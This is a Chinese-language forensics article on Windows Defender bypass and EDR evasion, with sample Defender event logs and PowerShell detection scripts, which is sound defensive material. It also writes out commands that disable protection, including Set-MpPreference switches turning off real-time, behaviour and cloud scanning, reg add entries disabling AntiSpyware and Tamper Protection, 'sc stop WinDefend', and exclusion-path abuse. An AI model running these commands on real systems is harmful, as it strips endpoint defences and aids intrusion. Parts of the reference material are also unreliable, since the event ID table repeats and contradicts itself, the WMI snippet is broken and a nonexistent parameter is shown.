---
title: "WindowsDefender绕过与EDR对抗取证分析"
date: 2026-06-26T14:00:00+08:00
draft: false
weight: 440
description: "围绕 Windows Defender 绕过和 EDR 对抗技术的完整体系，深入分析 Defender 架构与扫描机制、各类绕过技术、EDR 绕过技术、安全产品日志分析、取证特征识别等技术。"
categories: ["应急响应", "取证分析"]
tags: ["Windows Defender", "EDR", "绕过", "反检测", "排除目录", "策略篡改", "T1562", "T1027"]
---

# Windows Defender 绕过与 EDR 对抗取证分析

Windows Defender 是 Windows 操作系统内置的端点防护产品，EDR（Endpoint Detection and Response）则是企业环境中部署的高级威胁检测与响应平台。两者构成了端点安全防御的核心层级——Defender 负责实时恶意软件检测和拦截，EDR 负责行为监控、威胁狩猎和事件响应。当攻击者同时绕过 Defender 并对抗 EDR 时，端点就如同失去了所有安全防护的裸机——恶意代码可以自由执行、横向移动而不会触发任何告警。

MITRE ATT&CK 将防御绕过映射到 T1562（Impair Defenses）系列技术，涵盖禁用防御工具、修改配置、阻止日志记录等多种子技术。2025 年 Red Canary 威胁检测报告显示，防御规避（Defense Evasion）是攻击链中出现频率最高的战术阶段，78.6% 的攻击链包含至少一项防御规避技术。Mandiant 的 M-Trends 2025 报告指出，54% 的入侵事件中攻击者会主动禁用或绕过端点安全产品。

本文不讨论通用的恶意代码分析方法，而是**聚焦于 Windows Defender 绕过和 EDR 对抗技术的完整体系：从 Defender 架构到各类绕过手法，从 EDR 技术实现到对抗方法，从取证特征到检测规则，从证据分层到自动化狩猎**。

---

## 0x01 Windows Defender 架构概述

### Defender 的架构和组件

Windows Defender（现称 Microsoft Defender Antivirus）是微软内置于 Windows 10/11 和 Windows Server 的反恶意软件解决方案。它并非简单的签名扫描工具，而是一个包含多层检测引擎和保护组件的复杂安全平台。

**核心架构组件**：

1. **Real-Time Protection（实时保护）**：在文件访问、进程创建、网络连接等操作发生时实时拦截恶意行为。包含文件系统过滤器驱动（WdFilter.sys）、进程监控和网络过滤器
2. **Cloud Protection（云保护/MAPS）**：Microsoft Active Protection Service，将可疑文件的元数据和特征发送到微软云进行分析，利用大规模机器学习模型实时判定恶意性
3. **Network Protection（网络保护）**：基于 URL 信誉数据库拦截恶意网络连接，集成到 Windows 网络堆栈中，覆盖 HTTP/HTTPS/DNS 流量
4. **Behavior Monitoring（行为监控）**：基于行为模式检测未知恶意软件，监控进程行为链（文件创建、注册表修改、进程注入等）
5. **Tamper Protection（防篡改保护）**：自 Windows 10 2004 引入，防止恶意软件或攻击者修改 Defender 关键设置和文件

**Defender 引擎版本体系**：

| 组件 | 文件 | 功能 |
|---|---|---|
| MpEngine | MpEngine.dll | 核心扫描引擎 |
| WdFilter | WdFilter.sys | 文件系统过滤器驱动 |
| WdNisDrv | WdNisDrv.sys | 网络检查服务驱动 |
| WdBoot | WdBoot.sys | 启动时保护驱动 |
| MsMpEng.exe | MsMpEng.exe | 用户态主服务进程 |
| MpCmdRun.exe | MpCmdRun.exe | 命令行扫描工具 |

### 扫描引擎工作原理

Defender 的扫描引擎采用多层检测策略，从快速签名匹配到深度行为分析：

**签名扫描（Signature-Based Detection）**：
- **快速哈希匹配**：文件的 SHA-256 哈希与已知恶意软件签名库比对，速度极快
- **模糊哈希（Fuzzy Hashing）**：使用 SSDEEP/TLSH 等模糊哈希算法检测已知恶意软件的变体
- **字节序列匹配**：在文件中搜索已知恶意软件的特征字节序列（类似 YARA 规则）

**启发式检测（Heuristic Detection）**：
- **静态启发式**：分析 PE 文件结构（导入表、节区属性、入口点位置等），识别可疑特征
- **动态启发式**：在安全沙箱中执行文件，观察其行为是否符合恶意软件特征
- **机器学习模型**：基于大规模训练数据的分类模型，对文件特征进行评分

**行为监控（Behavior Monitoring）**：
- 实时监控进程的行为链，检测可疑操作序列
- 规则引擎定义行为模式（如短时间内创建大量文件、修改关键注册表键值、注入其他进程等）
- 结合上下文信息（进程父进程链、命令行参数、网络连接目标）进行综合判定

### 保护机制

Defender 依赖多个 Windows 安全子系统提供纵深防御：

**AMSI（Antimalware Scan Interface）**：
- 在脚本执行前将内容传递给 Defender 进行扫描
- 覆盖 PowerShell、VBScript、JScript、MSBuild 等宿主程序
- 支持解混淆后的脚本内容扫描

**ETW（Event Tracing for Windows）**：
- Defender 通过 ETW Provider 收集系统行为事件
- 内核级 ETW-TI（Threat Intelligence）Provider 提供进程注入、内存操作等高权限监控
- Defender 自身的 ETW Provider（`Microsoft-Windows-Windows Defender`）记录所有检测和防护事件

**AppLocker**：
- 应用白名单策略，限制未授权程序执行
- 与 Defender 协同工作，提供基于策略的应用控制

**WDAC（Windows Defender Application Control）**：
- 强制代码完整性策略，只允许经过签名的代码执行
- 支持基于哈希、签名者、路径等的多维度规则
- 内核级强制执行，比 AppLocker 更难绕过

### Defender 事件日志系统

Defender 的所有操作都记录在 Windows 事件日志中，核心日志通道为 `Microsoft-Windows-Windows Defender/Operational`。

**日志通道列表**：

| 日志通道 | 位置 | 内容 |
|---|---|---|
| Windows Defender/Operational | `Microsoft-Windows-Windows Defender%4Operational.evtx` | 检测、扫描、配置变更事件 |
| Windows Defender/WHC | `Microsoft-Windows-Windows Defender%4WHC.evtx` | Windows Hello 企业版相关 |
| Microsoft-Windows-Windows Defender API | `Microsoft-Windows-Windows Defender API%4Operational.evtx` | Defender API 调用事件 |

**日志启用状态检查**：

```powershell
Get-WinEvent -ListLog "Microsoft-Windows-Windows Defender/Operational" | Select-Object LogName, IsEnabled, IsClassicLog, MaximumSizeInBytes
```

**日志位置**：

```
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx
```

---

## 0x02 Defender 日志与监控分析

### Windows Defender 事件 ID 完整列表

Defender 在其 Operational 日志通道中记录大量事件 ID，每个 ID 对应特定类型的事件。以下是关键事件 ID 的完整分类：

**检测类事件（1000-1034 系列）**：

| Event ID | 描述 | 严重级别 |
|---|---|---|
| 1000 | 病毒和间谍软件防护检测到错误或失败 | 错误 |
| 1001 | 病毒和间谍软件防护执行扫描 | 信息 |
| 1002 | 用户强制扫描（按需扫描） | 信息 |
| 1005 | 用户对检测采取的操作 | 信息 |
| 1006 | 用户允许潜在威胁 | 信息 |
| 1007 | 用户强制删除项目 | 信息 |
| 1008 | 用户强制允许潜在威胁 | 信息 |
| 1009 | 用户还原了隔离项目 | 信息 |
| 1010 | 用户还原了潜在威胁 | 信息 |
| 1011 | 用户请求了对潜在威胁的高级分析 | 信息 |
| 1013 | 用户删除了历史记录 | 信息 |
| 1014 | 病毒和间谍软件防护发现可疑项 | 警告 |
| 1015 | 病毒和间谍软件防护检测到可疑行为 | 警告 |
| 1016 | 病毒和间谍软件防护检测到潜在风险行为 | 警告 |
| 1018 | 病毒和间谍软件防护执行快速扫描完成 | 信息 |
| 1019 | 病毒和间谍软件防护执行完整扫描完成 | 信息 |
| 1020 | 病毒和间谍软件防护执行自定义扫描完成 | 信息 |
| 1021 | 病毒和间谍软件防护执行离线扫描完成 | 信息 |
| 1022 | 已安装反恶意软件平台更新 | 信息 |
| 1023 | 反恶意软件平台更新失败 | 错误 |
| 1024 | 已安装反恶意软件引擎更新 | 信息 |
| 1025 | 反恶意软件引擎更新失败 | 错误 |
| 1026 | 反恶意软件平台更新成功 | 信息 |
| 1027 | 反恶意软件引擎更新成功 | 信息 |
| 1028 | 反恶意软件平台更新成功 | 信息 |
| 1029 | 反恶意软件引擎更新成功 | 信息 |
| 1030 | 反恶意软件平台更新成功 | 信息 |
| 1031 | 反恶意软件引擎更新成功 | 信息 |
| 1032 | 反恶意软件平台更新成功 | 信息 |
| 1033 | 反恶意软件引擎更新成功 | 信息 |
| 1034 | 反恶意软件平台更新成功 | 信息 |

### 检测事件详解

**Event ID 1116 — 恶意软件检测**：

这是 Defender 最核心的检测事件，当扫描引擎检测到恶意软件时触发。

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Windows Defender" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1116</EventID>
    <Version>0</Version>
    <Level>2</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000001</Keywords>
    <TimeCreated SystemTime="2026-06-26T06:15:32.1234567Z" />
    <EventRecordID>45678</EventRecordID>
    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
    <Computer>WORKSTATION01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="Product Name">Microsoft Defender Antivirus</Data>
    <Data Name="Product Version">4.18.2606.5</Data>
    <Data Name="Detection ID">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="Detection Time">2026-06-26T06:15:32.000Z</Data>
    <Data Name="Threat ID">2147843604</Data>
    <Data Name="Threat Name">Trojan:Win32/Meterpreter.A!ml</Data>
    <Data Name="Severity">Severe</Data>
    <Data Name="Category">Trojan</Data>
    <Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020</Data>
    <Data Name="Path Type">LocalDrive</Data>
    <Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="Action">Delete</Data>
    <Data Name="Old Value">N/A</Data>
    <Data Name="New Value">N/A</Data>
    <Data Name="Detection User SID">S-1-5-21-1234567890-1234567890-1234567890-1001</Data>
  </EventData>
</Event>
```

关键字段解读：
- **Threat Name**：检测到的威胁名称，包含家族和变体信息
- **Severity**：严重级别（Low/Medium/High/Severe）
- **Path Type**：路径类型（LocalDrive/NetworkDrive/HTTP/UNC 等）
- **Process Name**：触发检测的进程路径
- **Action**：Defender 采取的操作（Delete/Clean/Quarantine/Block 等）

**Event ID 1117 — 恶意软件防护操作**：

当 Defender 对检测到的威胁采取操作时记录。

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Windows Defender" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1117</EventID>
    <Version>0</Version>
    <Level>2</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000001</Keywords>
    <TimeCreated SystemTime="2026-06-26T06:15:33.1234567Z" />
    <EventRecordID>45679</EventRecordID>
    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
    <Computer>WORKSTATION01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="Product Name">Microsoft Defender Antivirus</Data>
    <Data Name="Product Version">4.18.2606.5</Data>
    <Data Name="Detection ID">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="Detection Time">2026-06-26T06:15:32.000Z</Data>
    <Data Name="Threat ID">2147843604</Data>
    <Data Name="Threat Name">Trojan:Win32/Meterpreter.A!ml</Data>
    <Data Name="Severity">Severe</Data>
    <Data Name="Category">Trojan</Data>
    <Data Name="Path Type">LocalDrive</Data>
    <Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="Action ID">2</Data>
    <Data Name="Action">已清除</Data>
    <Data Name="Action Success">Yes</Data>
    <Data Name="Additional Actions Bit Mask">0</Data>
    <Data Name="Additional Actions String">N/A</Data>
    <Data Name="Detection User SID">S-1-5-21-1234567890-1234567890-1234567890-1001</Data>
  </EventData>
</Event>
```

**Event ID 1118 — 防护操作失败**：

当 Defender 无法对检测到的威胁采取操作时记录。

### 扫描事件详解

**Event ID 1001 — 扫描完成**：

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Windows Defender" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1001</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-06-26T04:00:00.0000000Z" />
    <EventRecordID>45600</EventRecordID>
    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
    <Computer>WORKSTATION01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="Product Name">Microsoft Defender Antivirus</Data>
    <Data Name="Product Version">4.18.2606.5</Data>
    <Data Name="Scan ID">{F1E2D3C4-B5A6-7890-DCBA-FE0987654321}</Data>
    <Data Name="Scan Type">Quick Scan</Data>
    <Data Name="Scan Resources">全部</Data>
    <Data Name="Scan Status">已完成</Data>
    <Data Name="Scan Result">未检测到威胁</Data>
    <Data Name="Threat Name">N/A</Data>
    <Data Name="Threat ID">0</Data>
    <Data Name="Threat Severity">N/A</Data>
    <Data Name="Threat Category">N/A</Data>
    <Data Name="Threat FWLink">N/A</Data>
    <Data Name="Path Type">N/A</Data>
    <Data Name="Process Name">N/A</Data>
    <Data Name="Action ID">N/A</Data>
    <Data Name="Action Success">N/A</Data>
    <Data Name="Error Code">0x0</Data>
    <Data Name="Error Description">该操作成功完成。</Data>
    <Data Name="Scan Duration">00:01:32</Data>
    <Data Name="Scan Start Time">2026-06-26T03:58:28.000Z</Data>
    <Data Name="Scan End Time">2026-06-26T04:00:00.000Z</Data>
  </EventData>
</Event>
```

**Event ID 1002 — 用户强制扫描**：用户通过 UI 或命令行触发的扫描。

**Event ID 1006 — 保护更新失败**：Defender 签名库或引擎更新失败的事件。

### 防护事件详解

**Event ID 3001 / 3002 — 实时保护状态变更**：

实时保护被开启或关闭时记录。这是取证分析中极为关键的事件——如果实时保护被非预期地关闭，强烈暗示系统已被入侵。

**Event ID 3004 — 行为监控状态变更**：行为监控被修改时记录。

**Event ID 3007 — 云保护状态变更**：云保护（MAPS）被修改时记录。

### 日志分析方法和自动化查询

**快速查询所有 Defender 检测事件**：

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Windows Defender/Operational'
    Id = 1116, 1117, 1118
} -MaxEvents 100 | Format-Table TimeCreated, Id, Message -Wrap
```

**查询所有配置变更事件**：

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Windows Defender/Operational'
    Id = 5007, 5001, 5004, 5010, 5012
} -MaxEvents 100 | Format-Table TimeCreated, Id, Message -Wrap
```

**检测 Defender 保护被关闭的时间窗口**：

```powershell
$events = Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Windows Defender/Operational'
    Id = 3001, 3002, 3004, 3007
} -ErrorAction SilentlyContinue
foreach ($e in $events) {
    [PSCustomObject]@{
        Time = $e.TimeCreated
        EventId = $e.Id
        Status = if ($e.Message -match '已启用|已打开') { 'ENABLED' } else { 'DISABLED' }
    }
} | Format-Table -AutoSize
```

**使用 KQL 查询 Microsoft Sentinel 中的 Defender 事件**：

```kql
SecurityEvent
| where EventSourceName == "Microsoft-Windows-Windows Defender"
| where EventID in (1116, 1117, 1118)
| project TimeGenerated, Computer, EventID, Activity
| sort by TimeGenerated desc
```

---

## 0x03 Defender 绕过 — 排除目录与路径篡改（T1562.001）

### Defender 排除目录机制

Windows Defender 支持配置排除列表，使指定的路径、进程、文件扩展名或 IP 地址范围不受实时保护和扫描引擎监控。排除机制的设计初衷是避免安全软件与合法的系统管理操作产生冲突，但攻击者可以滥用这一机制将恶意代码放置在排除目录中以逃避检测。

**排除类型**：

| 排除类型 | PowerShell 参数 | 注册表路径 |
|---|---|---|
| 文件夹路径 | `ExclusionPath` | `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths` |
| 进程 | `ExclusionProcess` | `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes` |
| 文件扩展名 | `ExclusionExtension` | `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions` |
| IP 地址/URL | `ExclusionIpAddress` | `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\IpAddresses` |

**常见滥用的排除路径**：

攻击者通常添加以下路径作为排除项，因为这些路径在正常环境中经常被管理员排除：
- `C:\Temp`
- `C:\Windows\Temp`
- `C:\ProgramData`
- `C:\Users\*\AppData\Local\Temp`
- `C:\PerfLogs`

### 添加排除路径/进程/扩展名

**通过 PowerShell cmdlet 添加排除**：

```powershell
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft"
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionExtension "vbs"
Add-MpPreference -ExclusionIpAddress "192.168.1.0/24"
```

**通过注册表直接添加排除**：

```powershell
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\Microsoft" -Value 0 -PropertyType DWord -Force
```

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\Microsoft" /t REG_DWORD /d 0 /f
```

**通过 WMI 添加排除**（适用于无 PowerShell 的环境）：

```powershell
$namespace = "root\Microsoft\Windows\Defender"
$className = "MSFT_MpPreference"
$method = "Add"
$inParams = Get-WmiObject -Namespace $namespace -Class $className -Args @{ExclusionPath = @("C:\Temp")}, "Add"
```

**通过本地策略/Intune 配置排除**：

企业环境中，管理员可以通过组策略或 Intune 集中管理 Defender 排除项：
- GPO 路径：`计算机配置 > 管理模板 > Windows 组件 > Microsoft Defender 防病毒 > 排除`
- Intune 路径：`设备配置 > 防病毒策略 > Microsoft Defender 防病毒排除`

### 策略篡改绕过（Set-MpPreference）

`Set-MpPreference` cmdlet 是修改 Defender 配置的主要 PowerShell 接口。攻击者可以利用此 cmdlet 篡改多项关键配置：

**禁用实时保护**：

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**禁用行为监控**：

```powershell
Set-MpPreference -DisableBehaviorMonitoring $true
```

**禁用入侵检测系统（IDS）**：

```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true
```

**禁用 IOAV 保护（下载文件扫描）**：

```powershell
Set-MpPreference -DisableIOAVProtection $true
```

**禁用云保护**：

```powershell
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent 2
```

**修改扫描日程**：

```powershell
Set-MpPreference -ScanScheduleQuickScanTime 03:00:00
Set-MpPreference -RemediationScheduleDay 0
```

**禁用脚本扫描**：

```powershell
Set-MpPreference -DisableScriptScanning $true
```

### 注册表直接修改

Defender 的所有配置都存储在 Windows 注册表中。在某些情况下，攻击者可能直接修改注册表而非使用 PowerShell cmdlet，以避免触发 PowerShell 日志。

**核心注册表键值**：

```
HKLM\SOFTWARE\Microsoft\Windows Defender
├── DisableRealtimeMonitoring    (DWORD) 1=禁用
├── DisableBehaviorMonitoring    (DWORD) 1=禁用
├── DisableOnAccessProtection    (DWORD) 1=禁用
├── DisableScanOnRealtimeEnable  (DWORD) 1=禁用
├── DisableIOAVProtection        (DWORD) 1=禁用
├── DisableIntrusionPreventionSystem (DWORD) 1=禁用
├── DisableEndpointProtection    (DWORD) 1=禁用
├── DisableTamperProtection      (DWORD) 1=禁用（需特殊权限）
├── DisableAntiSpyware           (DWORD) 1=禁用
├── DisableAntiVirus             (DWORD) 1=禁用
├── PassiveMonitoring            (DWORD) 1=被动模式
└── PassiveMode                  (DWORD) 1=被动模式
```

**通过 reg.exe 直接修改**：

```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

**通过 Set-MpPreference 配合注册表策略实现持久化**：

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
```

### 取证特征（Event ID 5007、注册表修改记录）

**Event ID 5007 — Defender 配置变更**：

每当 Defender 的任何配置被修改时，都会记录 Event ID 5007 事件。

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Windows Defender" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>5007</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-06-26T06:30:00.0000000Z" />
    <EventRecordID>45700</EventRecordID>
    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
    <Computer>WORKSTATION01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="Product Name">Microsoft Defender Antivirus</Data>
    <Data Name="Product Version">4.18.2606.5</Data>
    <Data Name="Setting Name">HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring</Data>
    <Data Name="Setting Value">1</Data>
    <Data Name="Old Value">0</Data>
    <Data Name="New Value">1</Data>
    <Data Name="Source">注册表</Data>
    <Data Name="Setting Type">注册表策略</Data>
  </EventData>
</Event>
```

**注册表审计日志**：

如果启用了注册表审计策略，可以通过 Security 日志中的 Event ID 4657（注册表值修改）追溯注册表修改操作：

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
    <EventID>4657</EventID>
    <Version>0</Version>
    <Level>14</Level>
    <Task>12</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2026-06-26T06:29:58.0000000Z" />
    <EventRecordID>123456</EventRecordID>
    <Channel>Security</Channel>
    <Computer>WORKSTATION01</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-21-1234567890-1234567890-1234567890-1001</Data>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="SubjectDomainName">DOMAIN</Data>
    <Data Name="SubjectLogonId">0x3e7</Data>
    <Data Name="ObjectName">HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths</Data>
    <Data Name="ObjectValueName">C:\ProgramData\Microsoft</Data>
    <Data Name="HandleId">0x1a8</Data>
    <Data Name="OperationType">Value Set</Data>
    <Data Name="NewValue">0</Data>
    <Data Name="OldValue">%%1793</Data>
  </EventData>
</Event>
```

**Sysmon 排除篡改监控**：

Sysmon Event ID 12（Registry Event）可以监控 Defender 注册表键值的创建和修改。

### 检测方法

**排除路径完整性检测**：

```powershell
$currentExclusions = (Get-MpPreference).ExclusionPath
$suspiciousExclusions = $currentExclusions | Where-Object {
    $_ -notmatch "^(C:\\Windows|C:\\Program Files|C:\\Program Files \(x86\))" -and
    $_ -notmatch "(Microsoft|Visual Studio|Java|Citrix|VMware)"
}
if ($suspiciousExclusions) {
    Write-Warning "可疑的排除路径："
    $suspiciousExclusions | ForEach-Object {
        [PSCustomObject]@{
            Path = $_
            Exists = Test-Path $_
            Contents = if (Test-Path $_) { (Get-ChildItem $_ -File -ErrorAction SilentlyContinue).Count } else { "不存在" }
        }
    }
}
```

**排除路径变更检测**：

```powershell
$baseline = Get-Content "C:\SecurityBaseline\defender_exclusions_baseline.json" | ConvertFrom-Json
$current = Get-MpPreference
$added = $current.ExclusionPath | Where-Object { $_ -notin $baseline.ExclusionPath }
$removed = $baseline.ExclusionPath | Where-Object { $_ -notin $current.ExclusionPath }
if ($added) { Write-Warning "新增排除路径: $($added -join ', ')" }
if ($removed) { Write-Warning "已移除排除路径: $($removed -join ', ')" }
```

**注册表策略检测**：

```powershell
$policyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (Test-Path $policyPath) {
    Get-ChildItem $policyPath -Recurse -ErrorAction SilentlyContinue |
        ForEach-Object {
            [PSCustomObject]@{
                Path = $_.PSPath
                Name = $_.PSChildName
                Value = $_.GetValue('')
            }
        }
}
```

---

## 0x04 Defender 绕过 — 文件与进程保护篡改

### 禁用实时保护

实时保护（Real-Time Protection）是 Defender 的核心防线，通过文件系统过滤器驱动（WdFilter.sys）在文件创建、修改、执行时进行拦截。

**通过 Set-MpPreference 禁用**：

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**通过注册表策略强制禁用**：

```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

**通过 Windows 服务控制禁用**：

```cmd
sc stop WinDefend
sc config WinDefend start= disabled
```

**通过 Tamper Protection 绕过**：

Tamper Protection 自 Windows 10 2004 起默认启用，防止通过 PowerShell、注册表或组策略修改 Defender 关键设置。攻击者需要先禁用 Tamper Protection：

```powershell
Set-MpPreference -DisableTamperProtection $true
```

注意：自 Defender 版本 4.18.2104+ 起，Tamper Protection 已集成到 Microsoft 365 Defender 中，仅可通过 Microsoft 365 Defender 门户或 Intune 管理。

### 禁用行为监控

行为监控（Behavior Monitoring）是检测无签名恶意软件的关键机制。

```powershell
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
```

### 禁用云保护

云保护（MAPS - Microsoft Active Protection Service）利用微软的云端分析能力提供实时检测。

```powershell
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -CloudBlockLevel Disabled
Set-MpPreference -CloudExtendedTimeout 0
```

### 禁用网络保护

网络保护（Network Protection）阻止设备连接到已知恶意 URL 和 IP。

```powershell
Set-MpPreference -EnableNetworkProtection Disabled
```

### 禁用防篡改保护

Tamper Protection 是保护 Defender 配置不被恶意修改的最后一道防线。

**通过 Intune/MDM 禁用**：

在 Microsoft Endpoint Manager 控制台中，导航到 `设备 > 防病毒策略 > Microsoft Defender 防病毒`，将 Tamper Protection 设为 `Off`。

**通过注册表禁用（需要 SYSTEM 权限）**：

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
```

**攻击者禁用 Tamper Protection 的典型攻击链**：

1. 利用已获取的本地管理员权限提升到 SYSTEM
2. 通过注册表修改 Tamper Protection 标志
3. 或通过修改 `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` 中的启动类型来禁用服务
4. 然后执行 Set-MpPreference 禁用各项保护

### 取证特征（Event ID 5001/5004/5007/5012）

**Event ID 5001 — 实时保护状态变更**：

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Windows Defender" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>5001</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-06-26T06:30:01.0000000Z" />
    <EventRecordID>45701</EventRecordID>
    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
    <Computer>WORKSTATION01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="Product Name">Microsoft Defender Antivirus</Data>
    <Data Name="Product Version">4.18.2606.5</Data>
    <Data Name="Real Time Protection Status">已禁用</Data>
  </EventData>
</Event>
```

**Event ID 5004 — 行为监控状态变更**：记录行为监控被启用或禁用。

**Event ID 5007 — 配置变更**：所有配置项修改的通用事件。

**Event ID 5010 — 扫描设置变更**：扫描配置被修改时记录。

**Event ID 5012 — 云保护设置变更**：云保护配置被修改时记录。

**Event ID 5016 — 网络保护设置变更**：网络保护被修改时记录。

### 检测方法

**实时保护完整性监控**：

```powershell
$protectionStates = [PSCustomObject]@{
    RealTimeMonitoring = (Get-MpPreference).DisableRealtimeMonitoring
    BehaviorMonitoring = (Get-MpPreference).DisableBehaviorMonitoring
    IOAVProtection = (Get-MpPreference).DisableIOAVProtection
    IntrusionPrevention = (Get-MpPreference).DisableIntrusionPreventionSystem
    ScriptScanning = (Get-MpPreference).DisableScriptScanning
    NetworkProtection = (Get-MpPreference).EnableNetworkProtection
    TamperProtection = (Get-MpPreference).DisableTamperProtection
    MAPSReporting = (Get-MpPreference).MAPSReporting
}
$alerts = @()
if ($protectionStates.RealTimeMonitoring -eq $true) { $alerts += "实时保护已被禁用" }
if ($protectionStates.BehaviorMonitoring -eq $true) { $alerts += "行为监控已被禁用" }
if ($protectionStates.IOAVProtection -eq $true) { $alerts += "IOAV保护已被禁用" }
if ($protectionStates.NetworkProtection -ne 1) { $alerts += "网络保护状态异常" }
if ($alerts.Count -gt 0) {
    $alerts | ForEach-Object { Write-Warning "[ALERT] $_" }
} else {
    Write-Host "所有保护状态正常"
}
```

**Defender 服务状态检测**：

```powershell
$service = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
if ($service.Status -ne 'Running') {
    Write-Warning "WinDefend 服务状态异常: $($service.Status)"
}
$startType = (Get-WmiObject Win32_Service -Filter "Name='WinDefend'").StartMode
if ($startType -ne 'Auto') {
    Write-Warning "WinDefend 启动类型异常: $startType"
}
```

---

## 0x05 Defender 绕过 — 无文件攻击与内存技术

### 无文件恶意软件概述

无文件恶意软件（Fileless Malware）是一种不在磁盘上存储可执行文件的恶意代码，完全在内存中执行。由于 Defender 的核心检测能力（签名扫描、哈希比对）依赖于文件系统访问，无文件恶意代码天然具有更高的隐蔽性。

**无文件攻击的执行模式**：

1. **PowerShell 内存执行**：脚本通过 `IEX`（Invoke-Expression）或 `[System.Reflection.Assembly]::Load()` 直接在内存中执行
2. **反射 DLL 加载**：恶意 DLL 不需要通过 `LoadLibrary` 加载，而是手动解析 PE 头并将代码映射到内存中执行
3. **进程空洞（Process Hollowing）**：创建合法进程的空进程，将其内存清空后写入恶意代码
4. **进程注入**：将恶意代码注入到已运行的合法进程中
5. **脚本宿主执行**：利用 wscript.exe、mshta.exe、regsvr32.exe 等系统工具执行恶意脚本

